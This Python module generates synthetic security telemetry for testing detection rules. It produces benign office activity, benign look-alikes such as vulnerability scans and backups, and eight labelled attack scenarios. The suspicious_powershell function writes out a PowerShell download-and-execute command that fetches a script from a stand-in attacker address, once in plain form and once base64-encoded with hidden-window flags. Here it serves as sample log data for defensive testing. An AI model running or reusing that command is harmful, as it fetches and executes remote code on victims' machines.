"""Synthetic security telemetry: benign background noise plus 8 attack scenarios.

Events loosely follow the Elastic Common Schema (ECS). Every event carries
`labels.scenario` ("benign" or the ID of the attack that produced it) as
ground truth, so we can measure detection accuracy.
"""

import base64
import random
from datetime import datetime, timedelta, timezone

from . import environment as env


def iso(ts: datetime) -> str:
    return ts.astimezone(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def _event(ts, category, action, scenario, **fields):
    doc = {
        "@timestamp": iso(ts),
        "event": {"category": category, "action": action},
        "labels": {"scenario": scenario},
    }
    for dotted, value in fields.items():
        node = doc
        parts = dotted.split("__")  # host__name -> host.name
        for p in parts[:-1]:
            node = node.setdefault(p, {})
        node[parts[-1]] = value
    return doc


def _auth(ts, user, src_ip, host, outcome, scenario, port=None, reason=None):
    fields = dict(user__name=user, source__ip=src_ip, host__name=host,
                  destination__ip=env.HOSTS.get(host, host), event__outcome=outcome)
    if port:
        fields["destination__port"] = port
    if reason:
        fields["event__reason"] = reason
    return _event(ts, "authentication", "logon", scenario, **fields)


def _flow(ts, src_ip, dst_ip, dst_port, nbytes, scenario, host=None):
    return _event(ts, "network", "connection", scenario,
                  source__ip=src_ip, destination__ip=dst_ip, destination__port=dst_port,
                  network__bytes=nbytes, host__name=host or _host_for_ip(src_ip))


def _process(ts, host, user, name, cmdline, scenario, sha256=None):
    fields = dict(host__name=host, user__name=user, process__name=name, process__command_line=cmdline)
    if sha256:
        fields["file__hash__sha256"] = sha256
    return _event(ts, "process", "start", scenario, **fields)


def _host_for_ip(ip):
    for name, addr in env.HOSTS.items():
        if addr == ip:
            return name
    return "external"


def _jitter(start, seconds):
    return start + timedelta(seconds=random.uniform(0, seconds))


# --------------------------------------------------------------------------- benign

def benign_events(start: datetime, seconds: float):
    """Normal office activity for a time slice of `seconds` length."""
    events = []
    n = max(1, int(seconds * random.uniform(0.6, 1.2)))  # roughly 1 event/sec
    for _ in range(n):
        ts = _jitter(start, seconds)
        user = random.choice(env.USERS)
        ws = random.choice(list(env.WORKSTATIONS))
        r = random.random()
        if r < 0.30:  # logons: mostly success, occasional typo
            outcome = "failure" if random.random() < 0.05 else "success"
            events.append(_auth(ts, user, env.WORKSTATIONS[ws], ws, outcome, "benign"))
        elif r < 0.40:  # mapping the file share (one destination host only)
            events.append(_auth(ts, user, env.WORKSTATIONS[ws], "SRV-FILE01", "success", "benign", port=445))
        elif r < 0.70:  # web / SaaS traffic, small transfers
            events.append(_flow(ts, env.WORKSTATIONS[ws], random.choice(env.EXTERNAL_BENIGN),
                                443, random.randint(2_000, 1_500_000), "benign", host=ws))
        elif r < 0.95:
            if random.random() < 0.1:
                cmd = random.choice(env.BENIGN_POWERSHELL)
                events.append(_process(ts, ws, user, "powershell.exe", cmd, "benign"))
            else:
                proc = random.choice(env.BENIGN_PROCESSES)
                events.append(_process(ts, ws, user, proc, f"C:\\Program Files\\{proc}", "benign"))
        else:  # routine IT group changes
            doc = _event(ts, "iam", "added-member-to-group", "benign",
                         user__name=random.choice(env.ADMINS), host__name="SRV-DC01",
                         group__name=random.choice(env.NORMAL_GROUPS),
                         user__target__name=user)
            events.append(doc)
    return events


# --------------------------------------------------------------------------- benign look-alikes
# Legitimate activity that resembles attacks. Untuned rules flag these (false positives).

def vuln_scan(start):
    target = random.choice(["10.10.0.10", "10.10.0.20", "10.10.0.30", "10.10.0.40"])
    return [_flow(_jitter(start, 60), "10.10.0.50", target, p, random.randint(40, 120), "benign_lookalike")
            for p in random.sample(range(1, 10000), 100)]


def admin_maintenance(start):
    targets = random.sample(["SRV-DC01", "SRV-FILE01", "SRV-WEB01", "SRV-DB01"], random.randint(3, 4))
    return [_auth(_jitter(start, 240), random.choice(env.ADMINS), "10.10.0.60", t, "success",
                  "benign_lookalike", port=3389) for t in targets]


def nightly_backup(start):
    return [_flow(_jitter(start, 240), "10.10.0.20", env.BACKUP_PROVIDER_IP, 443,
                  random.randint(20_000_000, 40_000_000), "benign_lookalike", host="SRV-FILE01")
            for _ in range(4)]


def forgotten_password(start):
    ws = random.choice(list(env.WORKSTATIONS))
    user = random.choice(env.USERS)
    return [_auth(_jitter(start, 180), user, env.WORKSTATIONS[ws], ws, "failure", "benign_lookalike",
                  reason="bad_password") for _ in range(random.randint(10, 16))]


LOOKALIKES = [vuln_scan, admin_maintenance, nightly_backup, forgotten_password]


# --------------------------------------------------------------------------- attacks

def brute_force(start):
    attacker = random.choice(env.EXTERNAL_HOSTILE)
    victim = random.choice(env.USERS)
    events = [_auth(_jitter(start, 120), victim, attacker, "SRV-WEB01", "failure", "brute_force",
                    reason="bad_password") for _ in range(random.randint(15, 40))]
    if random.random() < 0.3:  # sometimes the attacker gets in
        events.append(_auth(start + timedelta(seconds=125), victim, attacker, "SRV-WEB01",
                            "success", "brute_force"))
    return events


def malware_execution(start):
    ws = random.choice(list(env.WORKSTATIONS))
    bad = random.choice(sorted(env.KNOWN_BAD_HASHES))
    return [_process(start, ws, random.choice(env.USERS), "invoice_viewer.exe",
                     f"C:\\Users\\Public\\Downloads\\invoice_viewer.exe /silent", "malware_execution", sha256=bad)]


def lateral_movement(start):
    ws = random.choice(list(env.WORKSTATIONS))
    src = env.WORKSTATIONS[ws]
    user = random.choice(env.USERS)
    targets = random.sample([h for h in env.HOSTS if h != ws], random.randint(3, 6))
    return [_auth(_jitter(start, 180), user, src, t, "success", "lateral_movement",
                  port=random.choice([445, 3389, 5985])) for t in targets]


def privilege_escalation(start):
    return [_event(start, "iam", "added-member-to-group", "privilege_escalation",
                   user__name=random.choice(env.USERS), host__name="SRV-DC01",
                   group__name=random.choice(sorted(env.PRIVILEGED_GROUPS)),
                   user__target__name=random.choice(env.USERS))]


def data_exfiltration(start):
    ws = random.choice(list(env.WORKSTATIONS) + ["SRV-DB01", "SRV-FILE01"])
    src = env.HOSTS[ws]
    dst = random.choice(env.EXTERNAL_HOSTILE)
    return [_flow(_jitter(start, 200), src, dst, random.choice([443, 21, 8443]),
                  random.randint(12_000_000, 30_000_000), "data_exfiltration", host=ws)
            for _ in range(random.randint(4, 8))]


def unauthorized_access(start):
    acct = random.choice(env.DISABLED_ACCOUNTS)
    ws = random.choice(list(env.WORKSTATIONS))
    return [_auth(_jitter(start, 90), acct, env.WORKSTATIONS[ws], "SRV-DC01", "failure",
                  "unauthorized_access", reason="account_disabled")
            for _ in range(random.randint(1, 5))]


def suspicious_powershell(start):
    ws = random.choice(list(env.WORKSTATIONS))
    payload = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.120/a.ps1')"
                               .encode("utf-16le")).decode()
    cmd = random.choice([
        f"powershell.exe -nop -w hidden -enc {payload}",
        "powershell.exe -ExecutionPolicy Bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.120/a.ps1')\"",
    ])
    return [_process(start, ws, random.choice(env.USERS), "powershell.exe", cmd, "suspicious_powershell")]


def reconnaissance(start):
    scanner = random.choice(env.EXTERNAL_HOSTILE + list(env.WORKSTATIONS.values()))
    target = random.choice(list(env.SERVERS.values()))
    ports = random.sample(range(1, 10000), random.randint(30, 80))
    return [_flow(_jitter(start, 60), scanner, target, p, random.randint(40, 120), "reconnaissance")
            for p in ports]


ATTACKS = {
    "brute_force": brute_force,
    "malware_execution": malware_execution,
    "lateral_movement": lateral_movement,
    "privilege_escalation": privilege_escalation,
    "data_exfiltration": data_exfiltration,
    "unauthorized_access": unauthorized_access,
    "suspicious_powershell": suspicious_powershell,
    "reconnaissance": reconnaissance,
}


def simulate(start: datetime, minutes: int, attacks_per_hour: float = 6.0, step_seconds: int = 10,
             lookalikes_per_hour: float = 2.0):
    """Generate benign noise for `minutes`, with attacks and benign look-alikes sprinkled in."""
    events, injected = [], []
    t, end = start, start + timedelta(minutes=minutes)
    p_attack = attacks_per_hour * step_seconds / 3600
    p_lookalike = lookalikes_per_hour * step_seconds / 3600
    while t < end:
        events.extend(benign_events(t, step_seconds))
        if random.random() < p_lookalike:
            events.extend(random.choice(LOOKALIKES)(t))
        if random.random() < p_attack:
            name = random.choice(list(ATTACKS))
            events.extend(ATTACKS[name](t))
            injected.append((name, t))
        t += timedelta(seconds=step_seconds)
    events.sort(key=lambda e: e["@timestamp"])
    return events, injected


def now():
    return datetime.now(timezone.utc)
